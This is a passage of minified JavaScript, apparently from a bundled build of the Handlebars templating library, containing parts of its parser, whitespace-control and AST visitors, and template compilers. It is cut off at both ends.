81], 83: [2, 85], 87: [2, 18], 91: [2, 89], 102: [2, 53], 105: [2, 93], 111: [2, 19], 112: [2, 77], 117: [2, 97], 120: [2, 63], 123: [2, 69], 124: [2, 12], 136: [2, 75], 137: [2, 32] }, parseError: function (t) { throw new Error(t) }, parse: function (t) { var e = this, n = [0], i = [null], o = [], a = this.table, s = "", r = 0, g = 0, l = 0; this.lexer.setInput(t), this.lexer.yy = this.yy, this.yy.lexer = this.lexer, void 0 === (this.yy.parser = this).lexer.yylloc && (this.lexer.yylloc = {}); var c = this.lexer.yylloc; o.push(c); var I = this.lexer.options && this.lexer.options.ranges; "function" == typeof this.yy.parseError && (this.parseError = this.yy.parseError); for (var u, h, d, C, A, p, m, f, b, B, y = {}; ;) { if (d = n[n.length - 1], void 0 === (C = this.defaultActions[d] ? this.defaultActions[d] : (null == u && (B = void 0, "number" != typeof (B = e.lexer.lex() || 1) && (B = e.symbols_[B] || B), u = B), a[d] && a[d][u])) || !C.length || !C[0]) { var v = ""; if (!l) { for (p in b = [], a[d]) this.terminals_[p] && 2 < p && b.push("'" + this.terminals_[p] + "'"); v = this.lexer.showPosition ? "Parse error on line " + (r + 1) + ":\n" + this.lexer.showPosition() + "\nExpecting " + b.join(", ") + ", got '" + (this.terminals_[u] || u) + "'" : "Parse error on line " + (r + 1) + ": Unexpected " + (1 == u ? "end of input" : "'" + (this.terminals_[u] || u) + "'"), this.parseError(v, { text: this.lexer.match, token: this.terminals_[u] || u, line: this.lexer.yylineno, loc: c, expected: b }) } } if (C[0] instanceof Array && 1 < C.length) throw new Error("Parse Error: multiple actions possible at state: " + d + ", token: " + u); switch (C[0]) { case 1: n.push(u), i.push(this.lexer.yytext), o.push(this.lexer.yylloc), n.push(C[1]), u = null, h ? (u = h, h = null) : (g = this.lexer.yyleng, s = this.lexer.yytext, r = this.lexer.yylineno, c = this.lexer.yylloc, 0 < l && l--); break; case 2: if (m = this.productions_[C[1]][1], y.$ = i[i.length - m], y._$ = { first_line: o[o.length - (m || 1)].first_line, last_line: o[o.length - 1].last_line, first_column: o[o.length - (m || 1)].first_column, last_column: o[o.length - 1].last_column }, I && (y._$.range = [o[o.length - (m || 1)].range[0], o[o.length - 1].range[1]]), void 0 !== (A = this.performAction.call(y, s, g, r, this.yy, C[1], i, o))) return A; m && (n = n.slice(0, -1 * m * 2), i = i.slice(0, -1 * m), o = o.slice(0, -1 * m)), n.push(this.productions_[C[1]][0]), i.push(y.$), o.push(y._$), f = a[n[n.length - 2]][n[n.length - 1]], n.push(f); break; case 3: return !0 } } return !0 } }) }, emu: { rules: [2], inclusive: !1 }, com: { rules: [6], inclusive: !1 }, raw: { rules: [3, 4, 5], inclusive: !1 }, INITIAL: { rules: [0, 1, 44], inclusive: !0 } } }, n.lexer = i, new ((a.prototype = n).Parser = a)); function a() { this.yy = {} } e.default = o, t.exports = e.default }, function (t, e, n) { "use strict"; var i = n(1).default; e.__esModule = !0; var o = i(n(39)); function a() { var t = arguments.length <= 0 || void 0 === arguments[0] ? {} : arguments[0]; this.options = t } function h(t, e, n) { void 0 === e && (e = t.length); var i = t[e - 1], o = t[e - 2]; return i ? "ContentStatement" === i.type ? (o || !n ? /\r?\n\s*?$/ : /(^|\r?\n)\s*?$/).test(i.original) : void 0 : n } function d(t, e, n) { void 0 === e && (e = -1); var i = t[e + 1], o = t[e + 2]; return i ? "ContentStatement" === i.type ? (o || !n ? /^\s*?\r?\n/ : /^\s*?(\r?\n|$)/).test(i.original) : void 0 : n } function C(t, e, n) { var i, o = t[null == e ? 0 : e + 1]; !o || "ContentStatement" !== o.type || !n && o.rightStripped || (i = o.value, o.value = o.value.replace(n ? /^\s+/ : /^[ \t]*\r?\n?/, ""), o.rightStripped = o.value !== i) } function A(t, e, n) { var i = t[null == e ? t.length - 1 : e - 1]; if (i && "ContentStatement" === i.type && (n || !i.leftStripped)) { var o = i.value; return i.value = i.value.replace(n ? /\s+$/ : /[ \t]+$/, ""), i.leftStripped = i.value !== o, i.leftStripped } } (a.prototype = new o.default).Program = function (t) { var e = !this.options.ignoreStandalone, n = !this.isRootSeen; this.isRootSeen = !0; for (var i = t.body, o = 0, a = i.length; o < a; o++) { var s, r, g, l, c, I = i[o], u = this.accept(I); u && (s = h(i, o, n), r = d(i, o, n), g = u.openStandalone && s, l = u.closeStandalone && r, c = u.inlineStandalone && s && r, u.close && C(i, o, !0), u.open && A(i, o, !0), e && c && (C(i, o), A(i, o) && "PartialStatement" === I.type && (I.indent = /([ \t]+$)/.exec(i[o - 1].original)[1])), e && g && (C((I.program || I.inverse).body), A(i, o)), e && l && (C(i, o), A((I.inverse || I.program).body))) } return t }, a.prototype.BlockStatement = a.prototype.DecoratorBlock = a.prototype.PartialBlockStatement = function (t) { this.accept(t.program), this.accept(t.inverse); var e = t.program || t.inverse, n = t.program && t.inverse, i = n, o = n; if (n && n.chained) for (i = n.body[0].program; o.chained;)o = o.body[o.body.length - 1].program; var a, s = { open: t.openStrip.open, close: t.closeStrip.close, openStandalone: d(e.body), closeStandalone: h((i || e).body) }; return t.openStrip.close && C(e.body, null, !0), n ? ((a = t.inverseStrip).open && A(e.body, null, !0), a.close && C(i.body, null, !0), t.closeStrip.open && A(o.body, null, !0), !this.options.ignoreStandalone && h(e.body) && d(i.body) && (A(e.body), C(i.body))) : t.closeStrip.open && A(e.body, null, !0), s }, a.prototype.Decorator = a.prototype.MustacheStatement = function (t) { return t.strip }, a.prototype.PartialStatement = a.prototype.CommentStatement = function (t) { var e = t.strip || {}; return { inlineStandalone: !0, open: e.open, close: e.close } }, e.default = a, t.exports = e.default }, function (t, e, n) { "use strict"; var i = n(1).default; e.__esModule = !0; var o = i(n(6)); function a() { this.parents = [] } function s(t) { this.acceptRequired(t, "path"), this.acceptArray(t.params), this.acceptKey(t, "hash") } function r(t) { s.call(this, t), this.acceptKey(t, "program"), this.acceptKey(t, "inverse") } function g(t) { this.acceptRequired(t, "name"), this.acceptArray(t.params), this.acceptKey(t, "hash") } a.prototype = { constructor: a, mutating: !1, acceptKey: function (t, e) { var n = this.accept(t[e]); if (this.mutating) { if (n && !a.prototype[n.type]) throw new o.default('Unexpected node type "' + n.type + '" found when accepting ' + e + " on " + t.type); t[e] = n } }, acceptRequired: function (t, e) { if (this.acceptKey(t, e), !t[e]) throw new o.default(t.type + " requires " + e) }, acceptArray: function (t) { for (var e = 0, n = t.length; e < n; e++)this.acceptKey(t, e), t[e] || (t.splice(e, 1), e--, n--) }, accept: function (t) { if (t) { if (!this[t.type]) throw new o.default("Unknown type: " + t.type, t); this.current && this.parents.unshift(this.current), this.current = t; var e = this[t.type](t); return this.current = this.parents.shift(), !this.mutating || e ? e : !1 !== e ? t : void 0 } }, Program: function (t) { this.acceptArray(t.body) }, MustacheStatement: s, Decorator: s, BlockStatement: r, DecoratorBlock: r, PartialStatement: g, PartialBlockStatement: function (t) { g.call(this, t), this.acceptKey(t, "program") }, ContentStatement: function () { }, CommentStatement: function () { }, SubExpression: s, PathExpression: function () { }, StringLiteral: function () { }, NumberLiteral: function () { }, BooleanLiteral: function () { }, UndefinedLiteral: function () { }, NullLiteral: function () { }, Hash: function (t) { this.acceptArray(t.pairs) }, HashPair: function (t) { this.acceptRequired(t, "value") } }, e.default = a, t.exports = e.default }, function (t, e, n) { "use strict"; var i = n(1).default; e.__esModule = !0, e.SourceLocation = function (t, e) { this.source = t, this.start = { line: e.first_line, column: e.first_column }, this.end = { line: e.last_line, column: e.last_column } }, e.id = function (t) { return /^\[.*\]$/.test(t) ? t.substr(1, t.length - 2) : t }, e.stripFlags = function (t, e) { return { open: "~" === t.charAt(2), close: "~" === e.charAt(e.length - 3) } }, e.stripComment = function (t) { return t.replace(/^\{\{~?!-?-?/, "").replace(/-?-?~?\}\}$/, "") }, e.preparePath = function (t, e, n) { n = this.locInfo(n); for (var i = t ? "@" : "", o = [], a = 0, s = 0, r = e.length; s < r; s++) { var g = e[s].part, l = e[s].original !== g; if (i += (e[s].separator || "") + g, l || ".." !== g && "." !== g && "this" !== g) o.push(g); else { if (0 < o.length) throw new c.default("Invalid path: " + i, { loc: n }); ".." === g && a++ } } return { type: "PathExpression", data: t, depth: a, parts: o, original: i, loc: n } }, e.prepareMustache = function (t, e, n, i, o, a) { var s = i.charAt(3) || i.charAt(2), r = "{" !== s && "&" !== s; return { type: /\*/.test(i) ? "Decorator" : "MustacheStatement", path: t, params: e, hash: n, escaped: r, strip: o, loc: this.locInfo(a) } }, e.prepareRawBlock = function (t, e, n, i) { l(t, n), i = this.locInfo(i); var o = { type: "Program", body: e, strip: {}, loc: i }; return { type: "BlockStatement", path: t.path, params: t.params, hash: t.hash, program: o, openStrip: {}, inverseStrip: {}, closeStrip: {}, loc: i } }, e.prepareBlock = function (t, e, n, i, o, a) { i && i.path && l(t, i); var s = /\*/.test(t.open); e.blockParams = t.blockParams; var r = void 0, g = void 0; if (n) { if (s) throw new c.default("Unexpected inverse block on decorator", n); n.chain && (n.program.body[0].closeStrip = i.strip), g = n.strip, r = n.program } o && (o = r, r = e, e = o); return { type: s ? "DecoratorBlock" : "BlockStatement", path: t.path, params: t.params, hash: t.hash, program: e, inverse: r, openStrip: t.strip, inverseStrip: g, closeStrip: i && i.strip, loc: this.locInfo(a) } }, e.prepareProgram = function (t, e) { { var n, i; !e && t.length && (n = t[0].loc, i = t[t.length - 1].loc, n && i && (e = { source: n.source, start: { line: n.start.line, column: n.start.column }, end: { line: i.end.line, column: i.end.column } })) } return { type: "Program", body: t, strip: {}, loc: e } }, e.preparePartialBlock = function (t, e, n, i) { return l(t, n), { type: "PartialBlockStatement", name: t.path, params: t.params, hash: t.hash, program: e, openStrip: t.strip, closeStrip: n && n.strip, loc: this.locInfo(i) } }; var c = i(n(6)); function l(t, e) { if (e = e.path ? e.path.original : e, t.path.original !== e) { var n = { loc: t.path.loc }; throw new c.default(t.path.original + " doesn't match " + e, n) } } }, function (t, e, n) { "use strict"; var i = n(1).default; e.__esModule = !0, e.Compiler = a, e.precompile = function (t, e, n) { if (null == t || "string" != typeof t && "Program" !== t.type) throw new g.default("You must pass a string or Handlebars AST to Handlebars.precompile. You passed " + t); "data" in (e = e || {}) || (e.data = !0); e.compat && (e.useDepths = !0); var i = n.parse(t, e), o = (new n.Compiler).compile(i, e); return (new n.JavaScriptCompiler).compile(o, e) }, e.compile = function (i, o, a) { void 0 === o && (o = {}); if (null == i || "string" != typeof i && "Program" !== i.type) throw new g.default("You must pass a string or Handlebars AST to Handlebars.compile. You passed " + i); "data" in (o = l.extend({}, o)) || (o.data = !0); o.compat && (o.useDepths = !0); var s = void 0; function r() { var t = a.parse(i, o), e = (new a.Compiler).compile(t, o), n = (new a.JavaScriptCompiler).compile(e, o, void 0, !0); return a.template(n) } function t(t, e) { return (s = s || r()).call(this, t, e) } return t._setup = function (t) { return (s = s || r())._setup(t) }, t._child = function (t, e, n, i) { return (s = s || r())._child(t, e, n, i) }, t }; var g = i(n(6)), l = n(5), r = i(n(35)), o = [].slice; function a() { } function s(t) { var e; t.path.parts || (e = t.path, t.path = { type: "PathExpression", data: !1, depth: 0, parts: [e.original + ""], original: e.original + "", loc: e.loc }) } a.prototype = { compiler: a, equals: function (t) { var e = this.opcodes.length; if (t.opcodes.length !== e) return !1; for (var n = 0; n < e; n++) { var i = this.opcodes[n], o = t.opcodes[n]; if (i.opcode !== o.opcode || !function t(e, n) { if (e === n) return !0; if (l.isArray(e) && l.isArray(n) && e.length === n.length) { for (var i = 0; i < e.length; i++)if (!t(e[i], n[i])) return !1; return !0 } }(i.args, o.args)) return !1 } e = this.children.length; for (n = 0; n < e; n++)if (!this.children[n].equals(t.children[n])) return !1; return !0 }, guid: 0, compile: function (t, e) { this.sourceNode = [], this.opcodes = [], this.children = [], this.options = e, this.stringParams = e.stringParams, this.trackIds = e.trackIds, e.blockParams = e.blockParams || []; var n = e.knownHelpers; if (e.knownHelpers = { helperMissing: !0, blockHelperMissing: !0, each: !0, if: !0, unless: !0, with: !0, log: !0, lookup: !0 }, n) for (var i in n) this.options.knownHelpers[i] = n[i]; return this.accept(t) }, compileProgram: function (t) { var e = (new this.compiler).compile(t, this.options), n = this.guid++; return this.usePartial = this.usePartial || e.usePartial, this.children[n] = e, this.useDepths = this.useDepths || e.useDepths, n }, accept: function (t) { if (!this[t.type]) throw new g.default("Unknown type: " + t.type, t); this.sourceNode.unshift(t); var e = this[t.type](t); return this.sourceNode.shift(), e }, Program: function (t) { this.options.blockParams.unshift(t.blockParams); for (var e = t.body, n = e.length, i = 0; i < n; i++)this.accept(e[i]); return this.options.blockParams.shift(), this.isSimple = 1 === n, this.blockParams = t.blockParams ? t.blockParams.length : 0, this }, BlockStatement: function (t) { s(t); var e = t.program, n = t.inverse, e = e && this.compileProgram(e), n = n && this.compileProgram(n), i = this.classifySexpr(t); "helper" === i ? this.helperSexpr(t, e, n) : "simple" === i ? (this.simpleSexpr(t), this.opcode("pushProgram", e), this.opcode("pushProgram", n), this.opcode("emptyHash"), this.opcode("blockValue", t.path.original)) : (this.ambiguousSexpr(t, e, n), this.opcode("pushProgram", e), this.opcode("pushProgram", n), this.opcode("emptyHash"), this.opcode("ambiguousBlockValue")), this.opcode("append") }, DecoratorBlock: function (t) { var e = t.program && this.compileProgram(t.program), n = this.setupFullMustacheParams(t, e, void 0), i = t.path; this.useDecorators = !0, this.opcode("registerDecorator", n.length, i.original) }, PartialStatement: function (t) { this.usePartial = !0; var e = (e = t.program) && this.compileProgram(t.program), n = t.params; if (1 < n.length) throw new g.default("Unsupported number of partial arguments: " + n.length, t); n.length || (this.options.explicitPartialContext ? this.opcode("pushLiteral", "undefined") : n.push({ type: "PathExpression", parts: [], depth: 0 })); var i = t.name.original, o = "SubExpression" === t.name.type; o && this.accept(t.name), this.setupFullMustacheParams(t, e, void 0, !0); var a = t.indent || ""; this.options.preventIndent && a && (this.opcode("appendContent", a), a = ""), this.opcode("invokePartial", o, i, a), this.opcode("append") }, PartialBlockStatement: function (t) { this.PartialStatement(t) }, MustacheStatement: function (t) { this.SubExpression(t), t.escaped && !this.options.noEscape ? this.opcode("appendEscaped") : this.opcode("append") }, Decorator: function (t) { this.DecoratorBlock(t) }, ContentStatement: function (t) { t.value && this.opcode("appendContent", t.value) }, CommentStatement: function () { }, SubExpression: function (t) { s(t); var e = this.classifySexpr(t); "simple" === e ? this.simpleSexpr(t) : "helper" === e ? this.helperSexpr(t) : this.ambiguousSexpr(t) }, ambiguousSexpr: function (t, e, n) { var i = t.path, o = i.parts[0], a = null != e || null != n; this.opcode("getContext", i.depth), this.opcode("pushProgram", e), this.opcode("pushProgram", n), i.strict = !0, this.accept(i), this.opcode("invokeAmbiguous", o, a) }, simpleSexpr: function (t) { var e = t.path; e.strict = !0, this.accept(e), this.opcode("resolvePossibleLambda") }, helperSexpr: function (t, e, n) { var i = this.setupFullMustacheParams(t, e, n), o = t.path, a = o.parts[0]; if (this.options.knownHelpers[a]) this.opcode("invokeKnownHelper", i.length, a); else { if (this.options.knownHelpersOnly) throw new g.default("You specified knownHelpersOnly, but used the unknown helper " + a, t); o.strict = !0, o.falsy = !0, this.accept(o), this.opcode("invokeHelper", i.length, o.original, r.default.helpers.simpleId(o)) } }, PathExpression: function (t) { this.addDepth(t.depth), this.opcode("getContext", t.depth); var e = t.parts[0], n = r.default.helpers.scopedId(t), i = !t.depth && !n && this.blockParamIndex(e); i ? this.opcode("lookupBlockParam", i, t.parts) : e ? t.data ? (this.options.data = !0, this.opcode("lookupData", t.depth, t.parts, t.strict)) : this.opcode("lookupOnContext", t.parts, t.falsy, t.strict, n) : this.opcode("pushContext") }, StringLiteral: function (t) { this.opcode("pushString", t.value) }, NumberLiteral: function (t) { this.opcode("pushLiteral", t.value) }, BooleanLiteral: function (t) { this.opcode("pushLiteral", t.value) }, UndefinedLiteral: function () { this.opcode("pushLiteral", "undefined") }, NullLiteral: function () { this.opcode("pushLiteral", "null") }, Hash: function (t) { var e = t.pairs, n = 0, i = e.length; for (this.opcode("pushHash"); n < i; n++)this.pushParam(e[n].value); for (; n--;)this.opcode("assignToHash", e[n].key); this.opcode("popHash") }, opcode: function (t) { this.opcodes.push({ opcode: t, args: o.call(arguments, 1), loc: this.sourceNode[0].loc }) }, addDepth: function (t) { t && (this.useDepths = !0) }, classifySexpr: function (t) { var e, n, i = r.default.helpers.simpleId(t.path), o = i && !!this.blockParamIndex(t.path.parts[0]), a = !o && r.default.helpers.helperExpression(t), s = !o && (a || i); return s && !a && (e = t.path.parts[0], (n = this.options).knownHelpers[e] ? a = !0 : n.knownHelpersOnly && (s = !1)), a ? "helper" : s ? "ambiguous" : "simple" }, pushParams: function (t) { for (var e = 0, n = t.length; e < n; e++)this.pushParam(t[e]) }, pushParam: function (t) { var e, n, i = null != t.value ? t.value : t.original || ""; this.stringParams ? (i.replace && (i = i.replace(/^(\.?\.\/)*/g, "").replace(/\//g, ".")), t.depth && this.addDepth(t.depth), this.opcode("getContext", t.depth || 0), this.opcode("pushStringParam", i, t.type), "SubExpression" === t.type && this.accept(t)) : (this.trackIds && (e = void 0, !t.parts || r.default.helpers.scopedId(t) || t.depth || (e = this.blockParamIndex(t.parts[0])), e ? (n = t.parts.slice(1).join("."), this.opcode("pushId", "BlockParam", e, n)) : ((i = t.original || i).replace && (i = i.replace(/^this(?:\.|$)/, "").replace(/^\.\//, "").replace(/^\.$/, "")), this.opcode("pushId", t.type, i))), this.accept(t)) }, setupFullMustacheParams: function (t, e, n, i) { var o = t.params; return this.pushParams(o), this.opcode("pushProgram", e), this.opcode("pushProgram", n), t.hash ? this.accept(t.hash) : this.opcode("emptyHash", i), o }, blockParamIndex: function (t) { for (var e = 0, n = this.options.blockParams.length; e < n; e++) { var i = this.options.blockParams[e], o = i && l.indexOf(i, t); if (i && 0 <= o) return [e, o] } } } }, function (t, e, n) { "use strict"; var i = n(1).default; e.__esModule = !0; var o = n(4), d = i(n(6)), a = n(5), s = i(n(43)); function g(t) { this.value = t } function r() { } r.prototype = { nameLookup: function (t, e) { return "constructor" === e ? ["(", t, ".propertyIsEnumerable('constructor') ? ", t, ".constructor : undefined", ")"] : r.isValidJavaScriptVariableName(e) ? [t, ".", e] : [t, "[", JSON.stringify(e), "]"] }, depthedLookup: function (t) { return [this.aliasable("container.lookup"), '(depths, "', t, '")'] }, compilerInfo: function () { var t = o.COMPILER_REVISION; return [t, o.REVISION_CHANGES[t]] }, appendToBuffer: function (t, e, n) { return a.isArray(t) || (t = [t]), t = this.source.wrap(t, e), this.environment.isSimple ? ["return ", t, ";"] : n ? ["buffer += ", t, ";"] : (t.appendToBuffer = !0, t) }, initializeBuffer: function () { return this.quotedString("") }, compile: function (t, e, n, i) { this.environment = t, this.options = e, this.stringParams = this.options.stringParams, this.trackIds = this.options.trackIds, this.precompile = !i, this.name = this.environment.name, this.isChild = !!n, this.context = n || { decorators: [], programs: [], environments: [] }, this.preamble(), this.stackSlot = 0, this.stackVars = [], this.aliases = {}, this.registers = { list: [] }, this.hashes = [], this.compileStack = [], this.inlineStack = [], this.blockParams = [], this.compileChildren(t, e), this.useDepths = this.useDepths || t.useDepths || t.useDecorators || this.options.compat, this.useBlockParams = this.useBlockParams || t.useBlockParams; var o = t.opcodes, a = void 0, s = void 0, r = void 0, g = void 0; for (r = 0, g = o.length; r < g; r++)a = o[r], this.source.currentLocation = a.loc, s = s || a.loc, this[a.opcode].apply(this, a.args); if (this.source.currentLocation = s, this.pushSource(""), this.stackSlot || this.inlineStack.length || this.compileStack.length) throw new d.default("Compile completed with content left on stack"); this.decorators.isEmpty() ? this.decorators = void 0 : (this.useDecorators = !0, this.decorators.prepend("var decorators = container.decorators;\n"), this.decorators.push("return fn;"), i ? this.decorators = Function.apply(this, ["fn", "props", "container", "depth0", "data", "blockParams", "depths", this.decorators.merge()]) : (this.decorators.prepend("function(fn, props, container, depth0, data, blockParams, depths) {\n"), this.decorators.push("}\n"), this.decorators = this.decorators.merge())); var l = this.createFunctionContext(i); if (this.isChild) return l; var c = { compiler: this.compilerInfo(), main: l }; this.decorators && (c.main_d = this.decorators, c.useDecorators = !0); for (var I = this.context, u = I.programs, h = I.decorators, r = 0, g = u.length; r < g; r++)u[r] && (c[r] = u[r], h[r] && (c[r + "_d"] = h[r], c.useDecorators = !0)); return this.environment.usePartial && (c.usePartial = !0), this.options.data && (c.useData = !0), this.useDepths && (c.useDepths = !0), this.useBlockParams && (c.useBlockParams = !0), this.options.compat && (c.compat = !0), i ? c.compilerOptions = this.options : (c.compiler = JSON.stringify(c.compiler), this.source.currentLocation = { start: { line: 1, column: 0 } }, c = this.objectLiteral(c), e.srcName ? (c = c.toStringWithSourceMap({ file: e.destName })).map = c.map && c.map.toString() : c = c.toString()), c }, preamble: function () { this.lastContext = 0, this.source = new s.default(this.options.srcName), this.decorators = new s.default(this.options.srcName) }, createFunctionContext: function (t) { var e = "", n = this.stackVars.concat(this.registers.list); 0 < n.length && (e += ", " + n.join(", ")); var i = 0; for (var o in this.aliases) { var a = this.aliases[o]; this.aliases.hasOwnProperty(o) && a.children && 1 < a.referenceCount && (e += ", alias" + ++i + "=" + o, a.children[0] = "alias" + i) } var s = ["container", "depth0", "helpers", "partials", "data"]; (this.useBlockParams || this.useDepths) && s.push("blockParams"), this.useDepths && s.push("depths"); var r = this.mergeSource(e); return t ? (s.push(r), Function.apply(this, s)) : this.source.wrap(["function(", s.join(","), ") {\n  ", r, "}"]) }, mergeSource: function (t) { var e = this.environment.isSimple, n = !this.forceBuffer, i = void 0, o = void 0, a = void 0, s = void 0; return this.source.each(function (t) { t.appendToBuffer ? (a ? t.prepend("  + ") : a = t, s = t) : (a && (o ? a.prepend("buffer += ") : i = !0, s.add(";"), a = s = void 0), o = !0, e || (n = !1)) }), n ? a ? (a.prepend("return "), s.add(";")) : o || this.source.push('return "";') : (t += ", buffer = " + (i ? "" : this.initializeBuffer()), a ? (a.prepend("return buffer + "), s.add(";")) : this.source.push("return buffer;")), t && this.source.prepend("var " + t.substring(2) + (i ? "" : ";\n")), this.source.merge() }, blockValue: function (t) { var e = this.aliasable("helpers.blockHelperMissing"), n = [this.contextName(0)]; this.setupHelperArgs(t, 0, n); var i = this.popStack(); n.splice(1, 0, i), this.push(this.source.functionCall(e, "call", n)) }, ambiguousBlockValue: function () { var t = this.aliasable("helpers.blockHelperMissing"), e = [this.contextName(0)]; this.setupHelperArgs("", 0, e, !0), this.flushInline(); var n = this.topStack(); e.splice(1, 0, n), this.pushSource(["if (!", this.lastHelper, ") { ", n, " = ", this.source.functionCall(t, "call", e), "}"]) }, appendContent: function (t) { this.pendingContent ? t = this.pendingContent + t : this.pendingLocation = this.source.currentLocation, this.pendingContent = t }, append: function () { var t; this.isInline() ? (this.replaceStack(function (t) { return [" != null ? ", t, ' : ""'] }), this.pushSource(this.appendToBuffer(this.popStack()))) : (t = this.popStack(), this.pushSource(["if (", t, " != null) { ", this.appendToBuffer(t, void 0, !0), " }"]), this.environment.isSimple && this.pushSource(["else { ", this.appendToBuffer("''", void 0, !0), " }"])) }, appendEscaped: function () { this.pushSource(this.appendToBuffer([this.aliasable("container.escapeExpression"), "(", this.popStack(), ")"])) }, getContext: function (t) { this.lastContext = t }, pushContext: function () { this.pushStackLiteral(this.contextName(this.lastContext)) }, lookupOnContext: function (t, e, n, i) { var o = 0; i || !this.options.compat || this.lastContext ? this.pushContext() : this.push(this.depthedLookup(t[o++])), this.resolvePath("context", t, o, e, n) }, lookupBlockParam: function (t, e) { this.useBlockParams = !0, this.push(["blockParams[", t[0], "][", t[1], "]"]), this.resolvePath("context", e, 1) }, lookupData: function (t, e, n) { t ? this.pushStackLiteral("container.data(data, " + t + ")") : this.pushStackLiteral("data"), this.resolvePath("data", e, 0, !0, n) }, resolvePath: function (n, i, o, a, t) { var s = this; if (this.options.strict || this.options.assumeObjects) this.push(function (t, e, n, i) { var o = e.popStack(), a = 0, s = n.length; t && s--; for (; a < s; a++)o = e.nameLookup(o, n[a], i); return t ? [e.aliasable("container.strict"), "(", o, ", ", e.quotedString(n[a]), ")"] : o }(this.options.strict && t, this, i, n)); else for (var e = i.length; o < e; o++)this.replaceStack(function (t) { var e = s.nameLookup(t, i[o], n); return a ? [" && ", e] : [" != null ? ", e, " : ", t] }) }, resolvePossibleLambda: function () { this.push([this.aliasable("container.lambda"), "(", this.popStack(), ", ", this.contextName(0), ")"]) }, pushStringParam: function (t, e) { this.pushContext(), this.pushString(e), "SubExpression" !== e && ("string" == typeof t ? this.pushString(t) : this.pushStackLiteral(t)) }, emptyHash: function (t) { this.trackIds && this.push("{}"), this.stringParams && (this.push("{}"), this.push("{}")), this.pushStackLiteral(t ? "undefined" : "{}") }, pushHash: function () { this.hash && this.hashes.push(this.hash), this.hash = { values: [], types: [], contexts: [], ids: [] } }, popHash: function () { var t = this.hash; this.hash = this.hashes.pop(), this.trackIds && this.push(this.objectLiteral(t.ids)), this.stringParams && (this.push(this.objectLiteral(t.contexts)), this.push(this.objectLiteral(t.types))), this.push(this.objectLiteral(t.values)) }, pushString: function (t) { this.pushStackLiteral(this.quotedString(t)) }, pushLiteral: function (t) { this.pushStackLiteral(t) }, pushProgram: function (t) { null != t ? this.pushStackLiteral(this.programExpression(t)) : this.pushStackLiteral(null) }, registerDecorator: function (t, e) { var n = this.nameLookup("decorators", e, "decorator"), i = this.setupHelperArgs(e, t); this.decorators.push(["fn = ", this.decorators.functionCall(n, "", ["fn", "props", "container", i]), " || fn;"]) }, invokeHelper: function (t, e, n) { var i = this.popStack(), o = this.setupHelper(t, e), a = n ? [o.name, " || "] : "", s = ["("].concat(a, i); this.options.strict || s.push(" || ", this.aliasable("helpers.helperMissing")), s.push(")"), this.push(this.source.functionCall(s, "call", o.callParams)) }, invokeKnownHelper: function (t, e) { var n = this.setupHelper(t, e); this.push(this.source.functionCall(n.name, "call", n.callParams)) }, invokeAmbiguous: function (t, e) { this.useRegister("helper"); var n = this.popStack(); this.emptyHash(); var i = this.setupHelper(0, t, e), o = ["(", "(helper = ", this.lastHelper = this.nameLookup("helpers", t, "helper"), " || ", n, ")"]; this.options.strict || (o[0] = "(helper = ", o.push(" != null ? helper : ", this.aliasable("helpers.helperMissing"))), this.push(["(", o, i.paramsInit ? ["),(", i.paramsInit] : [], "),", "(typeof helper === ", this.aliasable('"function"'), " ? ", this.source.functionCall("helper", "call", i.callParams), " : helper))"]) }, invokePartial: function (t, e, n) { var i = [], o = this.setupParams(e, 1, i); t && (e = this.popStack(), delete o.name), n && (o.indent = JSON.stringify(n)), o.helpers = "helpers", o.partials = "partials", o.decorators = "container.decorators", t ? i.unshift(e) : i.unshift(this.nameLookup("partials", e, "partial")), this.options.compat && (o.depths = "depths"), o = this.objectLiteral(o), i.push(o), this.push(this.source.functionCall("container.invokePartial", "", i)) }, assignToHash: function (t) { var e = this.popStack(), n = void 0, i = void 0, o = void 0; this.trackIds && (o = this.popStack()), this.stringParams && (i = this.popStack(), n = this.popStack()); var a = this.hash; n && (a.contexts[t] = n), i && (a.types[t] = i), o && (a.ids[t] = o), a.values[t] = e }, pushId: function (t, e, n) { "BlockParam" === t ? this.pushStackLiteral("blockParams[" + e[0] + "].path[" + e[1] + "]" + (n ? " + " + JSON.stringify("." + n) : "")) : "PathExpression" === t ? this.pushString(e) : "SubExpression" === t ? this.pushStackLiteral("true") : this.pushStackLiteral("null") }, compiler: r, compileChildren: function (t, e) { for (var n = t.children, i = void 0, o = void 0, a = 0, s = n.length; a < s; a++) { i = n[a], o = new this.compiler; var r, g = this.matchExistingProgram(i); null == g ? (this.context.programs.push(""), r = this.context.programs.length, i.index = r, i.name = "program" + r, this.context.programs[r] = o.compile(i, e, this.context, !this.precompile), this.context.decorators[r] = o.decorators, this.context.environments[r] = i, this.useDepths = this.useDepths || o.useDepths, this.useBlockParams = this.useBlockParams || o.useBlockParams, i.useDepths = this.useDepths, i.useBlockParams = this.useBlockParams) : (i.index = g.index, i.name = "program" + g.index, this.useDepths = this.useDepths || g.useDepths, this.useBlockParams = this.useBlockParams || g.useBlockParams) } }, matchExistingProgram: function (t) { for (var e = 0, n = this.context.environments.length; e < n; e++) { var i = this.context.environments[e]; if (i && i.equals(t)) return i } }, programExpression: function (t) { var e = this.environment.children[t], n = [e.index, "data", e.blockParams]; return (this.useBlockParams || this.useDepths) && n.push("blockParams"), this.useDepths && n.push("depths"), "container.program(" + n.join(", ") + ")" }, useRegister: function (t) { this.registers[t] || (this.registers[t] = !0, this.registers.list.push(t)) }, push: function (t) { return t instanceof g || (t = this.source.wrap(t)), this.inlineStack.push(t), t }, pushStackLiteral: function (t) { this.push(new g(t)) }, pushSource: function (t) { this.pendingContent && (this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation)), this.pendingContent = void 0), t && this.source.push(t) }, replaceStack: function (t) { var e = ["("], n = void 0, i = void 0, o = void 0; if (!this.isInline()) throw new d.default("replaceStack on non-inline"); var a, s = this.popStack(!0); s instanceof g ? (e = ["(", n = [s.value]], o = !0) : (i = !0, a = this.incrStack(), e = ["((", this.push(a), " = ", s, ")"], n = this.topStack()); var r = t.call(this, n); o || this.popStack(), i && this.stackSlot--, this.push(e.concat(r, ")")) }, incrStack: function () { return this.stackSlot++, this.stackSlot > this.stackVars.length && this.stackVars.push("stack" + this.stackSlot), this.topStackName() }, topStackName: function () { return "stack" + this.stackSlot }, flushInline: function () { var t = this.inlineStack; this.inlineStack = []; for (var e = 0, n = t.length; e < n; e++) { var i, o = t[e]; o instanceof g ? this.compileStack.push(o) : (i = this.incrStack(), this.pushSource([i, " = ", o, ";"]), this.compileStack.push(i)) } }, isInline: function () { return this.inlineStack.length }, popStack: function (t) { var e = this.isInline(), n = (e ? this.inlineStack 